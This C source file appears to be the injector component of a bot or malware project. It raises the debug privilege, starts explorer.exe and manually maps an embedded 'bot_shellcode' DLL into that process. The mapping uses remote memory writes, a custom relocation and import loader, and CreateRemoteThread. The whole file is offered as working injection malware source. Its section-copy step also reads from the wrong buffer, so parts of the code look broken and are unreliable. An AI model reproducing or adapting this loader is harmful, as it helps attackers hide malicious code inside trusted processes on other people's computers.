#include <Windows.h>

#include "..\common\api.h"
#include "..\common\mem.h"
#include "..\common\utils.h"

typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE,LPCSTR);

typedef BOOL (WINAPI *PDLL_MAIN)(HMODULE,DWORD,PVOID);

bot_t bot;

typedef struct
{
	PVOID ImageBase;
	PIMAGE_NT_HEADERS NtHeaders;
	PIMAGE_BASE_RELOCATION BaseRelocation;
	PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;
	pLoadLibraryA fnLoadLibraryA;
	pGetProcAddress fnGetProcAddress;

	bot_t remoteBot;
}MANUAL_INJECT;

#include "shellcode_core_x86.h"

DWORD WINAPI LoadDll(PVOID p)
{
	MANUAL_INJECT* ManualInject;

	HMODULE hModule;
	DWORD i,Function,count,delta;

	PDWORD ptr;
	PWORD list;

	PIMAGE_BASE_RELOCATION pIBR;
	PIMAGE_IMPORT_DESCRIPTOR pIID;
	PIMAGE_IMPORT_BY_NAME pIBN;
	PIMAGE_THUNK_DATA FirstThunk,OrigFirstThunk;

	PDLL_MAIN EntryPoint;

	ManualInject=(MANUAL_INJECT*)p;

	pIBR=ManualInject->BaseRelocation;
	delta=(DWORD)((LPBYTE)ManualInject->ImageBase-ManualInject->NtHeaders->OptionalHeader.ImageBase); // Calculate the delta

	// Relocate the image

	while(pIBR->VirtualAddress)
	{
		if(pIBR->SizeOfBlock>=sizeof(IMAGE_BASE_RELOCATION))
		{
			count=(pIBR->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);
			list=(PWORD)(pIBR+1);

			for(i=0;i<count;i++)
			{
				if(list[i])
				{
					ptr=(PDWORD)((LPBYTE)ManualInject->ImageBase+(pIBR->VirtualAddress+(list[i] & 0xFFF)));
					*ptr+=delta;
				}
			}
		}

		pIBR=(PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR+pIBR->SizeOfBlock);
	}

	pIID=ManualInject->ImportDirectory;

	// Resolve DLL imports

	while(pIID->Characteristics)
	{
		OrigFirstThunk=(PIMAGE_THUNK_DATA)((LPBYTE)ManualInject->ImageBase+pIID->OriginalFirstThunk);
		FirstThunk=(PIMAGE_THUNK_DATA)((LPBYTE)ManualInject->ImageBase+pIID->FirstThunk);

		hModule=ManualInject->fnLoadLibraryA((LPCSTR)ManualInject->ImageBase+pIID->Name);

		if(!hModule)
		{
			return FALSE;
		}

		while(OrigFirstThunk->u1.AddressOfData)
		{
			if(OrigFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				// Import by ordinal

				Function=(DWORD)ManualInject->fnGetProcAddress(hModule,(LPCSTR)(OrigFirstThunk->u1.Ordinal & 0xFFFF));

				if(!Function)
				{
					return FALSE;
				}

				FirstThunk->u1.Function=Function;
			}

			else
			{
				// Import by name

				pIBN=(PIMAGE_IMPORT_BY_NAME)((LPBYTE)ManualInject->ImageBase+OrigFirstThunk->u1.AddressOfData);
				Function=(DWORD)ManualInject->fnGetProcAddress(hModule,(LPCSTR)pIBN->Name);

				if(!Function)
				{
					return FALSE;
				}

				FirstThunk->u1.Function=Function;
			}

			OrigFirstThunk++;
			FirstThunk++;
		}

		pIID++;
	}

	if(ManualInject->NtHeaders->OptionalHeader.AddressOfEntryPoint)
	{
		EntryPoint=(PDLL_MAIN)((LPBYTE)ManualInject->ImageBase+ManualInject->NtHeaders->OptionalHeader.AddressOfEntryPoint);
		return EntryPoint((HMODULE)ManualInject->ImageBase,DLL_PROCESS_ATTACH,NULL); // Call the entry point
	}

	return TRUE;
}

DWORD WINAPI LoadDllEnd()
{
	return 0;
}

static BOOL _InjectPayload(const LPVOID lpPayload, DWORD dwSize)
{
	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_SECTION_HEADER pISH;

	PROCESS_INFORMATION pi;
	STARTUPINFOW si;
	LPWSTR pwzExplorerPath;

	LPVOID lpImage, lpParameters, lpLoader;
	DWORD i, dwLoaderSize;

	MANUAL_INJECT ManualInject;

	dwLoaderSize = (DWORD)LoadDllEnd - (DWORD)LoadDll;

	pIDH = (PIMAGE_DOS_HEADER)lpPayload;

	if(pIDH->e_magic!=IMAGE_DOS_SIGNATURE)
		return FALSE;

	pINH=(PIMAGE_NT_HEADERS)((LPBYTE)lpPayload + pIDH->e_lfanew);

	if(pINH->Signature!=IMAGE_NT_SIGNATURE)
		return FALSE;

	if(!(pINH->FileHeader.Characteristics & IMAGE_FILE_DLL))
		return FALSE;

	if((pwzExplorerPath = GetExplorerPath()) == NULL)
		return FALSE;

	memzero(&pi, sizeof(PROCESS_INFORMATION));
	memzero(&si, sizeof(STARTUPINFOW));

	if(CWA(CreateProcessW)(pwzExplorerPath, NULL, NULL, NULL, FALSE, 0/*CREATE_SUSPENDED | CREATE_NO_WINDOW*/, NULL, NULL, &si, &pi))
	{
		do 
		{
			if((lpImage = CWA(VirtualAllocEx)(pi.hProcess,NULL,pINH->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)) == NULL)
				break;

			if(!CWA(WriteProcessMemory)(pi.hProcess, lpImage, lpPayload,pINH->OptionalHeader.SizeOfHeaders,NULL))
				break;

			pISH =(PIMAGE_SECTION_HEADER)(pINH+1);

			for(i=0;i<pINH->FileHeader.NumberOfSections;i++)
			{
				CWA(WriteProcessMemory)(pi.hProcess,(PVOID)((LPBYTE)lpImage + pISH[i].VirtualAddress),(PVOID)((LPBYTE)lpImage+pISH[i].PointerToRawData),pISH[i].SizeOfRawData,NULL);
			}

			memzero(&ManualInject,sizeof(MANUAL_INJECT));

			ManualInject.ImageBase = lpImage;
			ManualInject.NtHeaders=(PIMAGE_NT_HEADERS)((LPBYTE)lpImage+pIDH->e_lfanew);
			ManualInject.BaseRelocation=(PIMAGE_BASE_RELOCATION)((LPBYTE)lpImage+pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
			ManualInject.ImportDirectory=(PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)lpImage+pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
			ManualInject.fnLoadLibraryA=LoadLibraryA;
			ManualInject.fnGetProcAddress=GetProcAddress;

			if((lpParameters = CWA(VirtualAllocEx)(pi.hProcess,NULL, sizeof(MANUAL_INJECT) ,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)) == NULL)
				break;

			CWA(GetModuleFileNameW)(NULL, ManualInject.remoteBot.wzBotPath, 255);

			if(!CWA(WriteProcessMemory)(pi.hProcess, lpParameters, &ManualInject, sizeof(MANUAL_INJECT), NULL))
				break;

			if((lpLoader = CWA(VirtualAllocEx)(pi.hProcess, NULL, dwLoaderSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)
				break;

			if(!CWA(WriteProcessMemory)(pi.hProcess, lpLoader, LoadDll, dwLoaderSize, NULL))
				break;

			if(CWA(CreateRemoteThread)(pi.hProcess, 0, 0,(LPTHREAD_START_ROUTINE)lpLoader, lpParameters, NULL, NULL) != 0)
				MessageBoxA(0, "Injected", 0, 0);
			//CWA(QueueUserAPC)(pi.hThread, lpLoader, lpParameters);

			CWA(ResumeThread)(pi.hThread);
		} 
		while (FALSE);
	}

	return TRUE;
}

BOOL WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in_opt LPSTR lpCmdLine, __in int nShowCmd )
{
	HANDLE hProcess,hThread,hFile,hToken;
	PVOID buffer,image,mem;
	DWORD i,FileSize,ProcessId,ExitCode,read;

	LPVOID lpShellcode;

	TOKEN_PRIVILEGES tp;
	MANUAL_INJECT ManualInject;

	memzero(&bot, sizeof(bot_t));

	bot.crc.crc32Initialized = FALSE;

	if (!InitializeAPI())
	{
		return TRUE;
	}

	if(OpenProcessToken((HANDLE)-1,TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
	{
		tp.PrivilegeCount=1;
		tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;

		tp.Privileges[0].Luid.LowPart=20;
		tp.Privileges[0].Luid.HighPart=0;

		AdjustTokenPrivileges(hToken,FALSE,&tp,0,NULL,NULL);
		CloseHandle(hToken);
	}

	if((lpShellcode = memalloc(sizeof(bot_shellcode))) != NULL)
	{
		memcopy(lpShellcode, &bot_shellcode, sizeof(bot_shellcode));

		return _InjectPayload(lpShellcode, sizeof(bot_shellcode));
	}

	return FALSE;
}